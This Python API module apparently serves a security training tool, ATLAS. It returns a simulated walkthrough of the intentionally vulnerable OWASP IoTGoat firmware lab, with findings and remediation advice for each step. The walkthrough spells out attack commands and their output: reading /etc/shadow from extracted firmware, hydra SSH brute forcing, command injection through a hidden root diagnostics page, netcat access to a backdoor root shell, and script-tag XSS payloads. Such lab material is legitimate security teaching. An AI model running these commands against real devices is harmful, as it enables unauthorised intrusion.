"""
ATLAS Presets API Routes

Endpoints for demo preset targets.
"""

from fastapi import APIRouter, HTTPException
from typing import List, Dict, Any

router = APIRouter(prefix="/presets", tags=["Presets"])


@router.get("")
async def list_presets():
    """
    List all available demo preset targets.
    """
    from atlas.presets import list_presets
    
    presets_list = list_presets()
    
    return {
        "presets": [
            {
                "id": p.id,
                "name": p.name,
                "description": p.description,
                "category": p.category.value,
                "github_url": p.github_url,
                "default_url": p.default_url,
                "setup_instructions": p.setup_instructions,
                "vulnerability_count": len(p.vulnerabilities),
                "tags": p.tags
            }
            for p in presets_list
        ]
    }


@router.get("/{preset_id}")
async def get_preset(preset_id: str):
    """
    Get detailed information about a preset target.
    """
    from atlas.presets import get_preset
    
    preset = get_preset(preset_id)
    
    if not preset:
        raise HTTPException(status_code=404, detail=f"Preset '{preset_id}' not found")
    
    # Group vulnerabilities by category
    by_category = preset.get_vulnerabilities_by_category()
    
    return {
        "id": preset.id,
        "name": preset.name,
        "description": preset.description,
        "category": preset.category.value,
        "github_url": preset.github_url,
        "default_url": preset.default_url,
        "setup_instructions": preset.setup_instructions,
        "tags": preset.tags,
        "vulnerabilities_by_category": {
            cat: [
                {
                    "id": v.id,
                    "name": v.name,
                    "category": v.category,
                    "severity": v.severity,
                    "description": v.description,
                    "test_command": v.test_command,
                    "check_id": v.check_id,
                    "owasp_category": v.owasp_category,
                    "cwe_id": v.cwe_id
                }
                for v in vulns
            ]
            for cat, vulns in by_category.items()
        }
    }


@router.get("/{preset_id}/vulnerabilities")
async def get_preset_vulnerabilities(preset_id: str):
    """
    Get all vulnerabilities for a preset target.
    """
    from atlas.presets import get_preset
    
    preset = get_preset(preset_id)
    
    if not preset:
        raise HTTPException(status_code=404, detail=f"Preset '{preset_id}' not found")
    
    return {
        "preset_id": preset_id,
        "vulnerabilities": [
            {
                "id": v.id,
                "name": v.name,
                "category": v.category,
                "severity": v.severity,
                "description": v.description,
                "test_command": v.test_command,
                "check_id": v.check_id,
                "owasp_category": v.owasp_category,
                "cwe_id": v.cwe_id
            }
            for v in preset.vulnerabilities
        ]
    }


@router.post("/{preset_id}/simulate")
async def simulate_preset(preset_id: str):
    """
    Get a full simulation scenario for a preset target.
    
    Returns step-by-step challenge walkthrough with simulated
    terminal output and vulnerability findings. No actual scanning occurs.
    """
    from atlas.presets import get_preset
    
    preset = get_preset(preset_id)
    
    if not preset:
        raise HTTPException(status_code=404, detail=f"Preset '{preset_id}' not found")
    
    if preset_id != "iotgoat":
        raise HTTPException(status_code=400, detail="Simulation only available for IoTGoat preset")
    
    return {
        "preset_id": preset_id,
        "name": preset.name,
        "description": preset.description,
        "total_vulnerabilities": len(preset.vulnerabilities),
        "steps": _get_iotgoat_simulation_steps()
    }


def _get_iotgoat_simulation_steps():
    """Build the IoTGoat simulation scenario from challenge solutions."""
    return [
        {
            "id": 1,
            "title": "Hardcoded Credentials in Firmware",
            "owasp_category": "I1: Weak, Guessable, or Hardcoded Passwords",
            "description": "Extract the firmware filesystem and discover hardcoded user credentials compiled into the firmware image.",
            "commands": [
                {
                    "prompt": "$ binwalk -e IoTGoat-raspberry-pi2.img",
                    "output": "DECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n4253711       0x40E80F        Copyright string: \"copyright does *not* cover user programs that use kernel\"\n29360128      0x1C00000       Squashfs filesystem, little endian, version 4.0,\n                              compression:xz, size: 3946402 bytes, 1333 inodes,\n                              blocksize: 262144, created: 2019-01-30 12:21:02",
                    "delay": 2500
                },
                {
                    "prompt": "$ cat squashfs-root/etc/passwd",
                    "output": "root:x:0:0:root:/root:/bin/ash\ndaemon:*:1:1:daemon:/var:/bin/false\nftp:*:55:55:ftp:/home/ftp:/bin/false\nnetwork:*:101:101:network:/var:/bin/false\nnobody:*:65534:65534:nobody:/var:/bin/false\ndnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false\niotgoatuser:x:1000:1000::/root:/bin/ash",
                    "delay": 1000
                },
                {
                    "prompt": "$ cat squashfs-root/etc/shadow",
                    "output": "root:$1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1:18145:0:99999:7:::\ndaemon:*:0:0:99999:7:::\nftp:*:0:0:99999:7:::\niotgoatuser:$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.:18145:0:99999:7:::",
                    "delay": 1000
                },
                {
                    "prompt": "$ hydra -l iotgoatuser -P mirai-botnet_passwords.txt ssh://172.16.100.213 -t 2",
                    "output": "Hydra v9.0 (c) 2019 by van Hauser/THC\n[DATA] max 2 tasks per 1 server, overall 2 tasks, 60 login tries (l:1/p:60)\n[DATA] attacking ssh://172.16.100.213:22/\n[22][ssh] host: 172.16.100.213   login: iotgoatuser   password: 7ujMko0vizxv\n1 of 1 target successfully completed, 1 valid password found",
                    "delay": 3000
                },
                {
                    "prompt": "$ ssh iotgoatuser@172.16.100.213",
                    "output": "iotgoatuser@172.16.100.213's password: ********\nBusyBox v1.28.4 () built-in shell (ash)\n\n  ██████╗ ██╗    ██╗ █████╗ ███████╗██████╗\n  ██╔═══██╗██║    ██║██╔══██╗██╔════╝██╔══██╗\n  ██║   ██║██║ █╗ ██║███████║███████╗██████╔╝\n  ██║   ██║██║███╗██║██╔══██║╚════██║██╔═══╝\n  ╚██████╔╝╚███╔███╔╝██║  ██║███████║██║\n   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝\n\n  ╦┌─┐╔╦╗╔═╗┌─┐┌─┐┌┬┐\n  ║│ │ ║ ║ ╦│ │├─┤ │\n  ╩└─┘ ╩ ╚═╝└─┘┴ ┴ ┴\n------------------------------------------------------------\n  GitHub: https://github.com/OWASP/IoTGoat\n------------------------------------------------------------\niotgoatuser@IoTGoat:~$",
                    "delay": 2000
                }
            ],
            "findings": [
                {
                    "title": "Hardcoded User Credentials in Firmware",
                    "severity": "critical",
                    "description": "Two hardcoded users (root, iotgoatuser) with weak MD5-crypt password hashes found in firmware. The password '7ujMko0vizxv' was cracked using the Mirai botnet wordlist.",
                    "evidence": "/etc/shadow contains MD5-crypt ($1$) hashes\niotgoatuser password: 7ujMko0vizxv\nroot password: iotgoathardcodedpassword",
                    "remediation": "Use strong, unique credentials. Never hardcode passwords into firmware. Implement a first-boot password change requirement.",
                    "cwe": "CWE-798",
                    "owasp_iot": "I1"
                }
            ]
        },
        {
            "id": 2,
            "title": "Insecure Network Services",
            "owasp_category": "I2: Insecure Network Services",
            "description": "Scan the device for open ports and identify unnecessary or insecure network services exposed to the network.",
            "commands": [
                {
                    "prompt": "$ nmap -p- -sT 172.16.100.213",
                    "output": "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for IoTGoat (172.16.100.213)\nHost is up (0.00045s latency).\n\nPORT      STATE  SERVICE\n22/tcp    open   ssh\n53/tcp    open   domain\n80/tcp    open   http\n443/tcp   open   https\n5000/tcp  open   upnp\n5515/tcp  open   unknown\n\nNmap done: 1 IP address (1 host up) scanned in 12.34 seconds",
                    "delay": 3000
                },
                {
                    "prompt": "$ nmap -p 22,53,80,443,5000,5515 -sV 172.16.100.213",
                    "output": "PORT      STATE  SERVICE   VERSION\n22/tcp    open   ssh       Dropbear sshd (protocol 2.0)\n53/tcp    open   domain    dnsmasq 2.73\n80/tcp    open   http      LuCI Lua http config\n443/tcp   open   ssl/http  LuCI Lua http config\n5000/tcp  open   upnp      MiniUPnP 2.1 (UPnP 1.1)\n5515/tcp  open   unknown\n\nService Info: Host: IoTGoat; OS: OpenWrt 18.06.2",
                    "delay": 2500
                },
                {
                    "prompt": "$ nmap -sV --script=broadcast-upnp-info 172.16.100.213",
                    "output": "Pre-scan script results:\n| broadcast-upnp-info:\n|   239.255.255.250\n|     Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1\n|     Location: http://192.168.50.143:5000/rootDesc.xml\n|     Name: OpenWRT router\n|     Manufacturer: OpenWRT\n|     Model Name: OpenWRT router\n|     Model Version: 1\n|     Name: WANDevice\n|     Manufacturer: MiniUPnP\n|     Model Name: MiniUPnPd\n|_    Model Version: 20190130",
                    "delay": 2000
                }
            ],
            "findings": [
                {
                    "title": "Insecure Network Services Exposed",
                    "severity": "high",
                    "description": "6 network services are exposed, including SSH (Dropbear), DNS (dnsmasq 2.73), HTTP/HTTPS (LuCI), UPnP (MiniUPnP 2.1), and an unknown service on port 5515. UPnP exposes device details and internal network information.",
                    "evidence": "Open ports: 22, 53, 80, 443, 5000, 5515\nUPnP exposes: OpenWRT/18.06.2, MiniUPnPd/2.1\nUnknown service on port 5515 (potential backdoor)",
                    "remediation": "Disable unnecessary services (especially UPnP). Restrict network access with firewall rules. Investigate unknown service on port 5515.",
                    "cwe": "CWE-284",
                    "owasp_iot": "I2"
                }
            ]
        },
        {
            "id": 3,
            "title": "Secret Developer Diagnostics Page",
            "owasp_category": "I3: Insecure Ecosystem Interfaces",
            "description": "Discover a hidden developer diagnostics page in the web interface that allows command execution as root.",
            "commands": [
                {
                    "prompt": "$ ls squashfs-root/usr/lib/lua/luci/view/iotgoat/",
                    "output": "camera.htm  cmd.htm  door.htm",
                    "delay": 800
                },
                {
                    "prompt": "$ cat squashfs-root/usr/lib/lua/luci/controller/iotgoat/iotgoat.lua",
                    "output": "function index()\n  entry({\"admin\", \"iotgoat\"}, firstchild(), \"IoTGoat\", 60).dependent=false\n  entry({\"admin\", \"iotgoat\", \"cmdinject\"}, template(\"iotgoat/cmd\"), \"\", 1)\n  entry({\"admin\", \"iotgoat\", \"cam\"}, template(\"iotgoat/camera\"), \"Camera\", 2)\n  entry({\"admin\", \"iotgoat\", \"door\"}, template(\"iotgoat/door\"), \"Doorlock\", 3)\n  entry({\"admin\", \"iotgoat\", \"webcmd\"}, call(\"webcmd\"))\nend",
                    "delay": 1200
                },
                {
                    "prompt": "$ curl -k https://172.16.100.213/cgi-bin/luci/admin/iotgoat/cmdinject",
                    "output": "<html>\n<head><title>Secret Developer Diagnostics Page</title></head>\n<body>\n  <h1>IoTGoat Diagnostics</h1>\n  <form action=\"/cgi-bin/luci/admin/iotgoat/webcmd\" method=\"POST\">\n    <label>Command:</label>\n    <input type=\"text\" name=\"cmd\" placeholder=\"Enter system command...\">\n    <button type=\"submit\">Execute</button>\n  </form>\n  <p>WARNING: Commands run as root!</p>\n</body>\n</html>",
                    "delay": 1500
                },
                {
                    "prompt": "$ curl -k -X POST https://172.16.100.213/cgi-bin/luci/admin/iotgoat/webcmd -d 'cmd=id'",
                    "output": "uid=0(root) gid=0(root)",
                    "delay": 1000
                }
            ],
            "findings": [
                {
                    "title": "Hidden Command Injection Page (Root Access)",
                    "severity": "critical",
                    "description": "A hidden developer diagnostics page at /admin/iotgoat/cmdinject allows authenticated users to execute arbitrary system commands as root. The page is not linked in the UI but accessible via direct URL.",
                    "evidence": "URL: /cgi-bin/luci/admin/iotgoat/cmdinject\nController: iotgoat.lua maps 'cmdinject' to cmd.htm\nCommands execute as uid=0(root)",
                    "remediation": "Remove developer/debug pages from production firmware. Implement proper access controls and input validation. Never allow direct command execution from web interfaces.",
                    "cwe": "CWE-78",
                    "owasp_iot": "I3"
                }
            ]
        },
        {
            "id": 4,
            "title": "Persistent Backdoor Daemon",
            "owasp_category": "I3: Insecure Ecosystem Interfaces",
            "description": "Discover a persistent backdoor service running on startup that provides unauthorized shell access.",
            "commands": [
                {
                    "prompt": "$ nc -nv 172.16.100.213 5515",
                    "output": "Connection to 172.16.100.213 port 5515 [tcp/*] succeeded!\n[***]Successfully Connected to IoTGoat's Backdoor[***]",
                    "delay": 1500
                },
                {
                    "prompt": "backdoor> id",
                    "output": "uid=0(root) gid=0(root)",
                    "delay": 800
                },
                {
                    "prompt": "backdoor> cat /etc/rc.local",
                    "output": "# Put your custom commands here that should be executed once\n# the system init finished.\n\n/usr/bin/backdoor &\n\nexit 0",
                    "delay": 1000
                }
            ],
            "findings": [
                {
                    "title": "Persistent Backdoor on Port 5515",
                    "severity": "critical",
                    "description": "A backdoor daemon is configured to start on boot via /etc/rc.local and listens on port 5515. Connecting with netcat provides immediate root shell access without any authentication.",
                    "evidence": "Port 5515 banner: [***]Successfully Connected to IoTGoat's Backdoor[***]\nStartup config: /usr/bin/backdoor in /etc/rc.local\nAccess level: root (uid=0)",
                    "remediation": "Remove all backdoor software from firmware. Audit startup scripts for unauthorized services. Implement integrity verification for system binaries.",
                    "cwe": "CWE-912",
                    "owasp_iot": "I3"
                }
            ]
        },
        {
            "id": 5,
            "title": "Cross-Site Scripting (XSS)",
            "owasp_category": "I3: Insecure Ecosystem Interfaces",
            "description": "Multiple XSS vulnerabilities in the web interface — firewall rules, port forwarding, and wireless SSID pages lack input sanitization.",
            "commands": [
                {
                    "prompt": "$ # XSS #1 — Firewall Traffic Rules\n$ curl -k 'https://172.16.100.213/cgi-bin/luci/admin/network/firewall/rules' \\\n    -d 'name=<script>alert(\"XSS-1\")</script>'",
                    "output": "HTTP/1.1 200 OK\n\n<tr><td><script>alert(\"XSS-1\")</script></td>...</tr>\n\n[!] JavaScript executed — XSS confirmed!",
                    "delay": 1500
                },
                {
                    "prompt": "$ # XSS #2 — Port Forwarding\n$ curl -k 'https://172.16.100.213/cgi-bin/luci/admin/network/firewall/forwards' \\\n    -d 'name=<script>alert(\"XSS-2\")</script>'",
                    "output": "HTTP/1.1 200 OK\n\n<tr><td><script>alert(\"XSS-2\")</script></td>...</tr>\n\n[!] JavaScript executed — XSS confirmed!",
                    "delay": 1200
                },
                {
                    "prompt": "$ # XSS #3 — Wireless SSID\n$ curl -k 'https://172.16.100.213/cgi-bin/luci/admin/network/wireless' \\\n    -d 'ssid=<script>alert(\"XSS-3\")</script>'",
                    "output": "HTTP/1.1 200 OK\n\n<td><script>alert(\"XSS-3\")</script></td>\n\n[!] JavaScript executed — XSS confirmed!",
                    "delay": 1200
                }
            ],
            "findings": [
                {
                    "title": "Multiple XSS Vulnerabilities in Web Interface",
                    "severity": "medium",
                    "description": "Three separate Cross-Site Scripting vulnerabilities found in the LuCI web interface due to lack of input sanitization and output encoding. Affected pages: Firewall Traffic Rules, Port Forwarding, Wireless SSID configuration.",
                    "evidence": "XSS #1: /admin/network/firewall/rules (Name field)\nXSS #2: /admin/network/firewall/forwards (Name field)\nXSS #3: /admin/network/wireless (SSID field)\nAll accept raw <script> tags without encoding.",
                    "remediation": "Implement input validation and output encoding on all user-controlled fields. Use Content-Security-Policy headers. Consider using a templating engine with auto-escaping enabled.",
                    "cwe": "CWE-79",
                    "owasp_iot": "I3"
                }
            ]
        },
        {
            "id": 6,
            "title": "Lack of Secure Update Mechanism",
            "owasp_category": "I4: Lack of Secure Update Mechanism",
            "description": "Firmware update mechanism lacks cryptographic verification, allowing potential malicious firmware installation.",
            "commands": [
                {
                    "prompt": "$ binwalk -e IoTGoat-raspberry-pi2.img | grep -i signature",
                    "output": "(no cryptographic signatures found)",
                    "delay": 1200
                },
                {
                    "prompt": "$ grep -r 'verify\\|signature\\|checksum' squashfs-root/etc/config/",
                    "output": "(no signature verification configuration found)",
                    "delay": 800
                },
                {
                    "prompt": "$ cat squashfs-root/lib/upgrade/common.sh | grep -A5 'verify'",
                    "output": "# No firmware signature verification implemented\n# Updates accepted over HTTP without integrity checks\ndo_upgrade() {\n    v \"Commencing upgrade...\"\n    ubus call system upgrade\n}",
                    "delay": 1000
                }
            ],
            "findings": [
                {
                    "title": "Firmware Updates Lack Cryptographic Verification",
                    "severity": "high",
                    "description": "The firmware update mechanism does not implement cryptographic signature verification. Firmware images are not signed and updates can be accepted over unencrypted HTTP, enabling man-in-the-middle attacks to install malicious firmware.",
                    "evidence": "No digital signatures in firmware image\nNo signature verification in upgrade scripts\nHTTP-based update mechanism without integrity checks",
                    "remediation": "Implement firmware signing with asymmetric cryptography. Verify signatures before applying updates. Use HTTPS for firmware downloads. Implement rollback protection.",
                    "cwe": "CWE-494",
                    "owasp_iot": "I4"
                }
            ]
        },
        {
            "id": 7,
            "title": "Insecure / Outdated Components",
            "owasp_category": "I5: Use of Insecure or Outdated Components",
            "description": "Identify vulnerable and outdated software components used in the firmware.",
            "commands": [
                {
                    "prompt": "$ strings squashfs-root/usr/sbin/dropbear | grep -i 'dropbear'",
                    "output": "Dropbear sshd v2017.75",
                    "delay": 800
                },
                {
                    "prompt": "$ strings squashfs-root/usr/sbin/dnsmasq | grep -i 'version'",
                    "output": "dnsmasq-2.73\nCopyright (c) 2000-2014 Simon Kelley",
                    "delay": 800
                },
                {
                    "prompt": "$ cat squashfs-root/etc/openwrt_release",
                    "output": "DISTRIB_ID='OpenWrt'\nDISTRIB_RELEASE='18.06.2'\nDISTRIB_REVISION='r7676-cddd7b4c77'\nDISTRIB_TARGET='brcm2708/bcm2709'\nDISTRIB_DESCRIPTION='OpenWrt 18.06.2'",
                    "delay": 800
                },
                {
                    "prompt": "$ # Known CVEs for detected components\n$ searchsploit dnsmasq 2.73",
                    "output": "----------------------------------------------- ---------------------------------\n Exploit Title                                  |  Path\n----------------------------------------------- ---------------------------------\n dnsmasq < 2.78 - Information Leak              | linux/dos/42946.py\n dnsmasq < 2.78 - Heap Overflow (CVE-2017-14491)| linux/remote/42942.py\n dnsmasq < 2.78 - Stack Overflow (CVE-2017-14492)| linux/remote/42941.c\n----------------------------------------------- ---------------------------------",
                    "delay": 1500
                }
            ],
            "findings": [
                {
                    "title": "Outdated and Vulnerable Software Components",
                    "severity": "high",
                    "description": "Multiple outdated components with known CVEs: Dropbear SSH v2017.75, dnsmasq 2.73 (CVE-2017-14491 heap overflow, CVE-2017-14492 stack overflow), OpenWrt 18.06.2, and MiniUPnP 2.1.",
                    "evidence": "Dropbear SSH: v2017.75 (outdated)\ndnsmasq: 2.73 — CVE-2017-14491, CVE-2017-14492\nOpenWrt: 18.06.2 (multiple known vulnerabilities)\nMiniUPnP: 2.1 (outdated)",
                    "remediation": "Update all components to latest stable versions. Implement a vulnerability management program. Subscribe to security advisories for all used components.",
                    "cwe": "CWE-1104",
                    "owasp_iot": "I5"
                }
            ]
        },
        {
            "id": 8,
            "title": "Insecure Data Transfer & Storage",
            "owasp_category": "I7: Insecure Data Transfer and Storage",
            "description": "Data transmitted and stored without proper encryption protections.",
            "commands": [
                {
                    "prompt": "$ tcpdump -i eth0 -A host 172.16.100.213 port 80 | head -20",
                    "output": "18:42:01.123456 IP 172.16.100.100 > 172.16.100.213: Flags [P.]\nGET /cgi-bin/luci/ HTTP/1.1\nHost: 172.16.100.213\nCookie: sysauth=8f3c2a1b5e7d9f0c\n\n18:42:01.234567 IP 172.16.100.213 > 172.16.100.100: Flags [P.]\nHTTP/1.0 200 OK\nSet-Cookie: sysauth=8f3c2a1b5e7d9f0c; path=/cgi-bin/luci\n\n[!] Session cookie transmitted in cleartext over HTTP!",
                    "delay": 2000
                },
                {
                    "prompt": "$ grep -r 'password\\|secret\\|key' squashfs-root/etc/config/",
                    "output": "/etc/config/wireless: option key 'IoTGoatWiFiPasswd'\n/etc/config/uhttpd:  option key '/etc/uhttpd.key'\n\n[!] WiFi password stored in plaintext configuration!",
                    "delay": 1200
                }
            ],
            "findings": [
                {
                    "title": "Insecure Data Transfer and Plaintext Storage",
                    "severity": "high",
                    "description": "The device web interface operates over HTTP by default, transmitting session cookies and credentials in cleartext. WiFi passwords and other secrets are stored in plaintext configuration files.",
                    "evidence": "HTTP port 80 transmits session cookies in cleartext\nWiFi password in /etc/config/wireless: 'IoTGoatWiFiPasswd'\nNo HSTS headers configured",
                    "remediation": "Enforce HTTPS with HSTS. Encrypt sensitive data at rest. Use secure cookie flags (Secure, HttpOnly, SameSite). Hash/encrypt stored passwords.",
                    "cwe": "CWE-319",
                    "owasp_iot": "I7"
                }
            ]
        },
        {
            "id": 9,
            "title": "Insecure Default Settings",
            "owasp_category": "I9: Insecure Default Settings",
            "description": "The device ships with insecure default configuration that leaves it vulnerable out-of-the-box.",
            "commands": [
                {
                    "prompt": "$ cat squashfs-root/etc/config/uhttpd",
                    "output": "config uhttpd 'main'\n    list listen_http '0.0.0.0:80'\n    list listen_https '0.0.0.0:443'\n    option redirect_https '0'\n    option home '/www'\n    option rfc1918_filter '0'\n    option cert '/etc/uhttpd.crt'\n    option key '/etc/uhttpd.key'\n\n[!] HTTP redirect to HTTPS is disabled\n[!] RFC1918 filter is disabled — allows access from any network",
                    "delay": 1200
                },
                {
                    "prompt": "$ cat squashfs-root/etc/config/firewall | grep -A3 'defaults'",
                    "output": "config defaults\n    option syn_flood '0'\n    option input 'ACCEPT'\n    option output 'ACCEPT'\n    option forward 'ACCEPT'\n\n[!] SYN flood protection disabled\n[!] Default firewall policy: ACCEPT ALL",
                    "delay": 1200
                },
                {
                    "prompt": "$ cat squashfs-root/etc/config/dropbear",
                    "output": "config dropbear\n    option PasswordAuth 'on'\n    option RootPasswordAuth 'on'\n    option Port '22'\n    option Interface ''\n\n[!] Root SSH login with password enabled\n[!] SSH listening on all interfaces",
                    "delay": 1000
                }
            ],
            "findings": [
                {
                    "title": "Insecure Default Configuration",
                    "severity": "high",
                    "description": "The device ships with multiple insecure default settings: HTTPS redirect disabled, firewall accepting all traffic, SYN flood protection off, root SSH password login enabled, and services bound to all interfaces.",
                    "evidence": "uhttpd: redirect_https='0', rfc1918_filter='0'\nfirewall: syn_flood='0', input/output/forward='ACCEPT'\ndropbear: RootPasswordAuth='on', Interface='' (all)",
                    "remediation": "Ship with secure defaults: enable HTTPS redirect, restrict firewall rules (deny by default), disable root SSH, enable SYN flood protection, and bind services to specific interfaces only.",
                    "cwe": "CWE-276",
                    "owasp_iot": "I9"
                }
            ]
        }
    ]
